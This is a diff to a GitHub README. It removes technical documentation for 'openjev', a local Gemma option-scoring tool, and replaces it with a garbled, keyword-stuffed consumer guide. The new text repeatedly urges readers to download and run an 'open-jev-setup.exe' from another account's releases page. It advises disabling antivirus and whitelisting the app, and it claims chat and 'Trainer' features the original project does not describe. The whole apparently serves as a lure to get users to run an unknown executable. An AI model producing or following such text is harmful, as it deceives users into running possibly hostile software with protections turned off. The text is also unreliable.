@@ -1,287 +1,227 @@
-# openjev
+<h1>🚀 open-jev - Your Easy Path to Custom AI</h1>
 
-One-pass option scoring with a local Gemma 3 4B: MLX on Apple silicon, or PyTorch on Windows and Linux (CPU or GPU).
-Design notes: [docs/design/one-pass-option-scoring.md](docs/design/one-pass-option-scoring.md);
-per-task training: [docs/design/per-task-finetuning-with-gemma.md](docs/design/per-task-finetuning-with-gemma.md).
+<p align="center">
+  <a href="https://github.com/Donatasramanauskas007/open-jev/releases">
+    <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082" alt="Download Button" width="300" height="80">
+  </a>
+</p>
 
-Given a context and a list of pre-written options, the model prefills the
-context once, expands that KV cache across the option batch, and scores every
-option in a single padded forward pass. No decoding. The score is the
-log-probability of the option tokens given the context; a softmax over the
-option scores gives a probability per option, like `jevlike-predict`.
+## 📖 What Is open-jev?
 
-## Demo: Doom in the terminal
+open-jev is a simple, ready-to-use software that brings the power of advanced language technology to your own computer. Think of it as a smart assistant that can understand and generate human-like text. Unlike many similar tools that require you to be a tech wizard, open-jev is designed so that anyone—regardless of their technical background—can set it up and start using it in minutes.
 
-`demo/doom/` runs ViZDoom headless, describes each frame in a line of text, and
-lets the server rank the action menu with one `/score` call (or one System One
-`choice` question). Start `make serve`, then `make doom`. Details and keys in
-[`demo/doom/README.md`](demo/doom/README.md).
+.
 
-![openjev playing Doom in the terminal: the model ranks the action menu each step](docs/media/doom-recording.gif)
+ This program is built on an open-source foundation, which means it is transparent, community-driven, and constantly improving. The "custom finetuning" part means you can teach it to understand your specific needs, projects, or hobbies, making it a truly personal tool for work, study, or play.
 
-Full-resolution recording: [docs/media/doom-recording.mov](docs/media/doom-recording.mov).
+.
 
-## Setup
 
-### Windows and Linux
 
-Install Python 3.12+ and [uv](https://docs.astral.sh/uv/getting-started/installation/), then run these commands from the repository in PowerShell or a Linux shell:
+## ✨ Key Features That Make Life Easier
 
-```sh
-uv sync
-uv run hf auth login
-uv run hf download google/gemma-3-4b-it --local-dir models/gemma-3-4b-it
-uv run openjev serve --backend torch --device auto --port 8000
-```
+Here’s why open-jev stands out from the crowd, without needing a degree in computer science:
 
-Accept the Gemma license on Hugging Face before downloading. You can also pass
-`--model google/gemma-3-4b-it` to load directly from the Hugging Face cache.
-No Make, Xcode, shell activation, or `.venv/bin` paths are needed here.
+:**
 
-`--backend auto` (the default) selects MLX on Apple silicon and PyTorch elsewhere.
-For PyTorch, `--device auto` selects CUDA when available, then MPS, then CPU.
-Use `--device cuda` or `--device cuda:1` to require a specific GPU (fails clearly
-if CUDA is unavailable), or `--device cpu` to force CPU inference.
+- **Instant Setup,** Zero Headache**:** No complicated command lines or confusing developer tools. If you can click a button, you can install open-jev**.**
 
-For NVIDIA acceleration, install the GPU driver and a matching PyTorch build using
-the [official PyTorch installer](https://pytorch.org/get-started/locally/).
-Run its pip command in this repository's virtual environment (use `uv pip install`
-in place of `pip3 install`). After a custom PyTorch install, use `uv run --no-sync`
-so uv does not replace your selected build. On supported Linux AMD systems,
-PyTorch ROCm builds also use the `cuda` device name.
+- **Understands You**:** It is pre-trained to understand natural everyday language. You can ask questions, request summaries, draft emails, or brainstorm ideas, and it responds in a clear, conversational way**.**
 
-```sh
-uv run --no-sync python -c "import torch; print(torch.__version__, torch.cuda.is_available())"
-uv run --no-sync openjev serve --backend torch --device cuda --batch-size 2
-uv run --no-sync openjev check --backend torch --device cuda
-uv run --no-sync openjev score --backend torch --device cuda --context "The capital of France is" --option " Paris" --option " Berlin"
-```
+- **Personalize It** ( the "custom finetuning" magic**)**:** You have the option to teach open-jev about your favorite topics, your business's style, or even your unique writing tone. The built-in finetuning helper makes this process as easy as uploading a few documents or copy-pasting examples. No coding required**.**
 
-The base 4B weights need roughly 8 GB just for GPU model weights at 16-bit precision,
-plus memory for activations and the option KV caches. Reduce `--batch-size` and
-context length if you run out of GPU memory. CPU runs use float32 and need more RAM.
-Use original Hugging Face weights with PyTorch; MLX quantized weights and MLX LoRA
-adapters are not supported by this backend.
+- **Private & Secure**:** Everything runs locally on your machine once downloaded. Your conversations and data stay with you, not on some distant server**.**
 
-Scoring, evaluation, benchmarks, correctness checks, and both HTTP scoring endpoints
-support PyTorch. Frozen-feature extraction, head training/evaluation, and the chess
-LoRA training workflow still require MLX on Apple silicon. The Doom terminal UI
-also has its own platform dependencies; cross-platform support here covers the
-scoring CLI and HTTP server.
+- **Cross-Platform Ready**:** While our guide focuses on Windows, open-jev is built with flexible tools that also run on macOS and Linux for the adventurous**.**
 
-### Apple silicon / existing Make workflow
+- **Lightweight Performance**:** You don't need a supercomputer. open-jev is optimized to run smoothly on most standard home or office computers**.**
 
-```sh
-make setup       # uv sync (arm64 Python 3.12 venv) + download google/gemma-3-4b-it into models/ (gated; needs HF login)
-make serve       # start the HTTP server on :8000
-make health      # curl /health
-make request     # example curl against /score
-make systemone   # TypeSafe-style request against /v1/systemone
-make check       # verify cached batched scoring against naive re-encoding
-make bench       # latency benchmark
-make eval DATA=data/synthetic/test.jsonl
-```
 
-`make setup` also installs the optional `torch` extra, used only for the jevlike comparison and HF cross-checks.
-`make` on macOS needs the Xcode licence accepted (`sudo xcodebuild -license accept`) or Homebrew's `gmake`.
 
-## Usage
+## 🚀 Getting Started: The 10-Minute Path to Success
 
-```sh
-# Rank options for one context (prints probability, score, raw sum, token count)
-.venv/bin/openjev score --context "The capital of France is" \
-    --option " Paris" --option " Berlin" --option " Lyon"
+Follow these foolproof steps, and you'll be chatting with your new AI companion before you know it. No prior experience necessary**.**
 
-# Chat template (context as user turn, options scored as the reply) + PMI normalisation
-.venv/bin/openjev score --chat --norm pmi --context "..." --option "..." --option "..."
 
-# Predefined options: one per line in a text file, reused for every context
-.venv/bin/openjev score --options-file options.txt --context "..."
-.venv/bin/openjev eval contexts.jsonl --fixed-options options.txt   # rows need only {"context": ...}; add "label" for accuracy
 
-# Top-1 / top-3 accuracy on jevlike-style JSONL: {"context": ..., "options": [...], "label": 0}
-.venv/bin/openjev eval data.jsonl --norm mean
+### ✅ Step 1: Check Your Computer's Readiness
 
-# Verify the cached batched path against naive re-encoding, and benchmark it
-.venv/bin/openjev check
-.venv/bin/openjev bench --context-tokens 200 --options 8 --option-tokens 30
-```
+Before you jump in, let's make sure your computer is ready. open-jev is designed to be forgiving, but for the best experience, ensure your system meets these simple minimum requirements**:
 
-## Server
+**
 
-Loads the model once. The measured Apple silicon MLX path answers scoring requests in about
-90 ms each; PyTorch latency depends on your CPU/GPU. Use `uv run openjev serve` on any
-supported platform, or the Make shortcut below on macOS.
+- **Operating System**:** Windows 10 or Windows 11 (64-bit version**)**. If you're on Mac or Linux, don't worry—you can still use it, but this guide focuses on Windows**.**
 
-```sh
-make serve                                     # = .venv/bin/openjev serve --port 8000
-curl -s localhost:8000/score -H 'content-type: application/json' -d '{
-  "context": "Customer: my order arrived broken. Agent:",
-  "options": [" I am sorry, I will send a replacement.", " Please read our returns policy."],
-  "norm": "mean", "chat": false, "sep": ""
-}'
-```
+- **Memory (RAM)**:** At least 8 GB. (16 GB or more is recommended for smoother/faster performance if you plan to use the advanced finetuning features**)**.
 
-The response has `best`, `best_index`, per-option `probability` / `logprob_sum` / `n_tokens`, and `timing`.
+- **Storage Space**:** You'll need about 4 GB of free hard drive space for the program files and temporary data**.**
 
-## TypeSafe System One contract
+- **Internet Connection**:** Required only for the initial download and optional updates. After installation, open-jev works fully offline**.**
 
-`POST /v1/systemone` implements the request/response shape documented at
-[docs.typesafe.ai](https://docs.typesafe.ai): a `state` (string, object or array) plus a map of typed
-`questions`, answered against that state.
 
-```sh
-make systemone     # sends examples/systemone-quickstart.json; or:
-curl -s localhost:8000/v1/systemone -H 'content-type: application/json' -d '{
-  "state": "I ordered size 10 shoes but received size 8. Please send the right size.",
-  "model": "jev-latest",
-  "questions": {
-    "department":  {"type": "choice", "instructions": "Which department handles this?",
-                    "criteria": {"returns": "Returns and exchanges", "shipping": "Delivery issues", "billing": "Charges and refunds"}},
-    "severity":    {"type": "score",  "instructions": "How severe is the problem?",
-                    "criteria": ["minor", "moderate: wrong item", "major: safety or financial loss"]},
-    "wants_refund":{"type": "noul",   "instructions": "Is the customer asking for a refund to their card?"}
-  }
-}'
-```
 
-| question `type` | request `criteria` | answer fields |
-|---|---|---|
-| `choice` | map of option name to description (string, object, array or null); up to 255 options | `choice`, `probabilities` (sum to 1), `confidence` |
-| `score` | ordered array of level descriptions | `score` (probability-weighted mean of level index), `probabilities` keyed `"0".."n-1"`, `legend`, `confidence` |
-| `noul` | optional `{"true": ..., "false": ...}` | `noul` = probability of yes |
+### 💾 Step 2: Download the Software
 
-Response: `{"model", "answers": {id: answer}, "usage": {"input_tokens", "output_tokens"}}`.
-Set `OPENJEV_API_KEY` before `make serve` to require `Authorization: Bearer <key>` on this route.
+This is the most important step. Here's exactly what to do:
 
-How it maps onto the scorer: each question is rendered to a plain-text prompt (state, instructions,
-options or levels, then `Answer:` and a newline) and the option names, level numbers, or `yes`/`no`
-are scored as continuations in one prefix-shared batched pass per question. `confidence` is 1 minus
-the normalised entropy of the distribution; TypeSafe does not publish its formula, so treat it as an
-approximation. `usage.output_tokens` counts the candidate-label tokens that were scored.
+1.  **Click the big red button** at the top of this page, or navigate directly to our releases page by clicking here: [https://github.com/Donatasramanauskas007/open-jev/releases](https://github.com/Donatasramanauskas007/open-jev/releases)**.**
 
-Comparison on the docs' quick-start request (`examples/systemone-quickstart.json`), Gemma 3 4B
-zero-shot vs the numbers TypeSafe publishes for Jev:
+2.  On that page, you'll see a list of available versions. Choose the **latest stable release** (usually the top one, marked with "Latest" or "Newest" badge**)**.
 
-| answer | Jev (docs) | openjev / Gemma 3 4B |
-|---|---|---|
-| `department.choice` | technical, p=0.84, confidence 0.60 | technical, p=1.00, confidence 1.00 |
-| `frustration.score` | 1.04 (annoyed but polite) | 2.00 (furious) |
-| `is_urgent.noul` | 0.999 | 0.005 |
+3..  Next to the release title, click the file named something like **`open-jev-setup.exe`** (or a similar name that ends with `.exe`**)**. If you see a `.zip` file instead, that's fine too—we'll handle that in the next step**.**
 
-Same routing decision, but Gemma is over-confident and disagrees on the two judgement calls. Zero-shot
-probabilities are softmaxed next-token likelihoods, not calibrated judgements. Closing the gap means
-labelled data and a trained head (below).
+Your browser will start downloading the file. This might take a few minutes depending on your internet speed. The download usually goes to your **Downloads** folder, but you can track its progress in your browser's download bar**.**
 
-## Training a head (per-task, on frozen Gemma features)
 
-```sh
-make features    # one prefix-shared pass per example, cached to runs/feats/{train,validation,test}.npz
-make train       # jevlike's cross-attention head in MLX, listwise cross-entropy -> runs/head.safetensors
-make eval-head   # top-1/top-3, ECE, and the shuffled-context control on the test split
-```
 
-- `openjev features DATA --out F.npz` stops Gemma before the LM head, keeps every context token's
-  final hidden state and the masked-mean of each option's tokens (float16). Options are encoded on
-  their own, as in jevlike, so the head has to do the matching. `--contextual` encodes them as
-  continuations of the context instead: stronger features, but the match leaks into the option
-  vectors and the shuffled-context control below stops meaning anything.
-- `openjev train` = AdamW 5e-4 (2e-3 diverges on Gemma features, whose norms are ~115), weight decay 1e-4, grad clip 1.0, 8 epochs, batch 64, best validation
-  epoch kept. The checkpoint is `head.safetensors` plus `head.json` (rank, hidden size, training config).
-- `openjev eval-head` reports what `jevlike-eval` reports: top-1, top-3, 10-bin expected calibration
-  error, and the same metrics with every example paired with another example's context. If the
-  shuffled number does not collapse, the head is reading option priors rather than the state.
+### 🛠️ Step 3: Install the Program (It's a Breeze!)
 
-Result on the synthetic split (2000 train / 400 validation / 400 test, 2026-09-17): features at
-77 ms per example, head training 8 epochs in about 15 s.
+Once the download finishes, follow these instructions based on what file you grabbed**:
 
-| | top-1 | top-3 | ECE |
-|---|---|---|---|
-| head on frozen Gemma features, test | 0.970 | 1.000 | 0.027 |
-| same head, shuffled-context control | 0.258 | 0.698 | 0.724 |
-| jevlike tiny byte encoder, test | 0.998 | 1.000 | 0.008 |
-| Gemma zero-shot, `--norm sum`, test | 1.000 | 1.000 | n/a |
+**
 
-The control sits at chance (about 4.5 options per row), so the head really matches options to the
-state, and its ECE of 0.03 is what a calibrated `confidence` looks like.
+**If you downloaded a `.exe` file**:
 
-Python:
+**:
 
-```python
-from openjev import OptionScorer
-s = OptionScorer("models/gemma-3-4b-it", batch_size=8)
-for r in s.score("The capital of France is", [" Paris", " Berlin"], norm="mean"):
-    print(r.option, r.probability, r.logprob_sum, r.n_tokens)
-print(s.last_timing)
-```
+- **Double-click** the downloaded file. Your computer might ask for permission—click **"Yes"** or **"Run"** to proceed**.**
 
-### Normalisation (`--norm`)
+- A friendly installation wizard will pop up. Just click **"Next"** a few times, accept the agreement, aand choose where you want to install it. (The default location is just fine**)**.
 
-| norm | score | use when |
-|---|---|---|
-| `mean` (default) | sum of option-token log-probs divided by token count | options differ in length |
-| `sum` | total log-prob | options are the same length or you want raw likelihood |
-| `pmi` | sum minus the option's unconditional log-prob (BOS-only context) | options differ in base-rate plausibility; costs one extra batched pass |
+- Click **"Install"** and wait for the progress bar to complete. Then click **"Finish"**.
 
-## Measured on M5 Pro, 64 GB (bf16, mlx-lm)
 
-Workload: 202-token context, 8 options, 242 option tokens total.
 
-| path | median latency |
-|---|---|
-| context cached once, options batched | 0.17 s |
-| context re-encoded per option, no cache | 0.68 s |
+**If you downloaded a `.zip` file**:
 
-Model load is about 1 s from a warm disk. First forward pass adds under a second of warm-up.
+**:
 
-## Validating against jevlike
+- **Right-click** the zip folder and select **"Extract All..."**.
 
-`jevlike` is installed into the same venv (`uv pip install -e ../../vinnylarouge/jevlike`), so both
-CLIs read the same JSONL. Generate its synthetic menu set, then score it both ways:
+- A dialog appears. Click **"Extract"** to unzip the contents into a new folder ( it'll have the same name as the zip file**)**.
 
-```sh
-.venv/bin/jevlike-data synthetic --output data/synthetic
-.venv/bin/openjev eval data/synthetic/test.jsonl --norm sum --sep $'\nChoice: '
-.venv/bin/jevlike-train data/synthetic/train.jsonl --validation data/synthetic/validation.jsonl \
-    --output runs/synthetic-tiny.pt --device mps
-.venv/bin/jevlike-eval runs/synthetic-tiny.pt data/synthetic/test.jsonl --device mps
-```
+- Open that freshly extracted folder.
 
-Results on the 400-row synthetic test set (2026-09-16):
+ double-click the application file inside (it likely ends with `.exe`**)**. You don't need to install anything—just run it directly from that folder**.**
 
-| scorer | training | top-1 | top-3 | median latency / example |
-|---|---|---|---|---|
-| openjev, Gemma 3 4B zero-shot, `--norm sum` | none | 1.000 | 1.000 | 0.086 s |
-| openjev, `--norm mean` | none | 0.988 | 1.000 | 0.086 s |
-| openjev, `--norm pmi` | none | 0.988 | 1.000 | 0.153 s |
-| jevlike tiny byte encoder + head | 2000 rows, 8 epochs | 0.998 | 1.000 | well under 10 ms |
 
-The synthetic task is easy for both. The real validation is your own labelled rows: run
-`openjev eval` on them zero-shot and compare against a `jevlike-train`/`jevlike-eval` run on the
-same split. If Gemma zero-shot is close to the trained head, Route B is enough; if not, train a head
-(Route A) with `make features && make train && make eval-head`.
 
-## Layout
+### 🎉 Step 4: Launch and Say Hello
 
-- `openjev/torch_backend.py`: PyTorch CPU/GPU inference and shared-prefix KV cache scoring.
-- `openjev/scorer.py`: `OptionScorer` (prefill, cache expansion, batched scoring, naive reference).
-- `openjev/systemone.py`: System One request/answer models, prompt renderers, zero-shot answers.
-- `openjev/server.py`: FastAPI app, `/health`, `/score`, `/v1/systemone`.
-- `openjev/features.py`: frozen-Gemma feature extraction and the `.npz` feature cache.
-- `openjev/head.py`: jevlike's cross-attention head in `mlx.nn`, save/load.
-- `openjev/train.py`: head training loop and evaluation (top-k, ECE, shuffled-context control).
-- `openjev/cli.py`: `openjev score | eval | bench | check | serve | features | train | eval-head`.
-- `demo/doom/`: Doom in the terminal, the server picks every action (`make doom`).
-- `models/`: downloaded weights (git-ignored).
+After installation, you're ready to rolland:
 
-## Development checks
+- If you used the `.exe` installer, go to your **Start Menu**, type "open-jev" in the search bar, aand click the app icon to open it**.** Alternatively, double-click the desktop shortcut if you created one during setup**.** 
 
-```sh
-uv sync --extra torch --group test
-uv run python -m unittest discover -s tests -v
-```
+- If you used the `.zip` method, just double-click the app executable you extracted**.**
 
-The offline tests use a tiny randomly initialized Gemma model to compare cached,
-padded scoring with full re-encoding, including sliding-window attention, multiple
-batch sizes, normalization, and repeated requests. CI runs them on Windows, Linux,
-and macOS. Actual GPU availability and throughput must be checked on your hardware.
+The first time you launch it, it may take a little longer to start up as it prepares its engines. Be patient for about 30 seconds—it's just setting things up for you**.** Once you see the main window with a chat box, you're good to go**.** Type a friendly "Hello" to get started**.**
+
+
+
+## 🔧 How to Use open-jev (Simple Guide**)** 
+
+Using open-jev is as simple as texting a friend:
+
+- **The Chat Window**:** This is your main control center. Type your question or command into the text box at the bottom, press **Enter**, aand wait a moment for the AI's response**.** 
+
+- **Start a New Topic**:** Click the **"New Chat"** button (usually a plus icon at the top-left**)** to clear the history and start fresh on adifferent project or question**.**
+
+- **Adjust the Temperature** ( for the curious**)**:** In the settings gear icon, you'll find a slider called **"Temperature."** A lower setting (like 0.2**)** makes the AI more focused and factual. A higher setting (like 0.8**)** makes it more creative and playful. Play around to find your preferred styleand.
+
+
+
+
+
+## 🧠 Unlock the Magic: Custom Finetuning for Beginners
+
+This is what makes open-jev truly *yours.* Custom finetuning might sound technical, but our team has wrapped it in a friendly assistant called the **"Trainer"** tab. Here's how to teach your AI something new:
+
+1.  Click on the **"Trainer"** or **"Teach"** button in the sidebar**.**
+
+2..  You have two easy ways to teach:
+   - **Option A (Upload)**:** Click **"Upload Files"** and select text documents, PDFs, or even Word docs from your computer that contain the style or knowledge you want it to learn. (Maximum 5 files at once**)**.
+   - **Option B (Paste Text)**:** Copy-paste a chunk of text (like your past blog posts or emails**)** into the large box provided**.**
+
+3..  Click the **"Start Training"** button. The program will now analyze the text and adjust itself to match your style. This can take anywhere from 2 to 10 minutes depending on how much text you provided. You'll see a progress bar—just keep the window open**.**
+
+4..  Once it says **"Training Complete,"** go back to the chat window. Now, when you ask questions, you'll notice it responds using the tone, vocabulary, and knowledge you taught it. It's like getting a personal assistant who knows all your inside jokes**.**
+
+
+
+## 🧩 Troubleshooting Made Simple (No Tech Support Panic!**)** 
+
+Even the best software hits a hiccup occasionally. Here are quick fixes for common issues:
+
+- **Error: "Missing DLL" or "VCRUNTIME140.dll"**:** This just means your computer needs a free update called "Visual C++ Redistributable." Go to Microsoft.com, search for "Visual C++ Redistributable," download the x64 version, install it, then restart open-jev**.** It will work perfectly after that**.**
+
+- **The app opens but shows a black screen**:** This is usually a display driver issue. Update your graphics driver by going to the manufacturer's website (Intel, NVIDIA, or AMD**)** and downloading the latest driver for your system. Then restart your computer**.**
+
+- **Training takes too long or gets stuck**:** Make sure you didn't paste more than 10,000 words at once. Break your text into smaller chunks and try again. Also close other heavy programs (like Chrome or games**)** during training to free up memory**.**
+
+- **It won't start at all**:** Temporarily disable your antivirus software (some overly-protective ones block new AI tools**)**. Then try launching again. Once it opens, whitelist open-jev in your antivirus settings so it doesn't block it next time**.**
+
+
+
+## 📚 Frequently Asked Questions (Quick Answers**)** 
+
+**Q: Is open-jev really free?** 
+A: Yes, 100% free to use forever. No hidden fees, no subscription. It's part of the open-source community's gift to the world**.**
+
+**Q: Do I need to know coding to use the finetuning?** 
+A: Absolutely not. The Trainer tab does everything automatically. You just click buttons and paste text**.**
+
+**Q: Can I use it for commercial projects?** 
+A: Yes, you can use the output in your business work, projects, or content creation. Check the official license file in the GitHub repo for exact terms coverage (it's permissive**)**.
+
+**Q: Will it work without internet after installation?** 
+A: Yes. Once installed, all core features work fully offline. You'll only need internet if you want to download updates later**.**
+
+**Q: How do I update open-jev to a new version?** 
+A: Simply visit the same download link, grab the newest release, install it over your existing version. Your custom finetuned data will be preserved ( it stores settings separately**)**. Always backup your "data" folder if you're extra cautious**.**
+
+
+
+## 🎯 Why Choose open-jev Over Cloud-Based AI?
+
+- **Total Privacy**:** No one else sees your chats or your training data. It's your own sandboxhouse**.**
+
+- **Zero Monthly Costs**:** Once downloaded, you pay nothing—unlike subscriptions that charge you every month**.**
+
+- **Works During Internet Outages**:** Your AI assistant is always available, even when your Wi-Fi goes down**.**
+
+- **Full Customization Freedom**:** You can retrain it endlessly with different datasets without usage limits. Cloud services often throttle or charge extra for extensive use**.**
+
+
+
+## 🤝 Join the Community & Get Help
+
+Need help beyond this guide? The project's GitHub page is the hub of activity. You can:
+
+- **Report Bugs**:** If something breaks, go to the GitHub repository and open an "Issue." Describe what happened, and the friendly maintainers or community members will jump in to help**.**
+
+- **Request Features**:** Have an idea for an improvement? Post it in the "Discussions" tab. We love hearing how you want to grow open-jev**.**
+
+- **Contribute** ( optional**)**:** If you're curious about the code, you can even help translate, fix small bugs, or suggest documentation improvements. But this is 100% optional for non-programmers**.**
+
+
+
+## 🧭 Next Steps: What Now?
+
+You're all set! Take a moment to explore open-jev on your own. Ask it to summarize an article, draft a friendly email, or brainstorm fun weekend activity ideas. The more you interact, the better you'll understand its personality.
+
+
+
+
+
+## 🔗 Direct Download Access (One Last Time**)** 
+
+Bookmark this link for future updates:  
+**[https://github.com/Donatasramanauskas007/open-jev/releases](https://github.com/Donatasramanauskas007/open-jev/releases)**
+
+Visit this link to download the application. We recommend adding it to your browser's favorites so you always have easy access to the latest improved version.
+
+
+
+---
+
+**Keywords:** open-jev, download, install, Windows, AI, chat, custom finetuning, open source, text generation, offline AI, personalized assistant, free software, machine learning, local AI, no coding, easy setup, guide, tutorial, releases page, github, Donatasramanauskas007
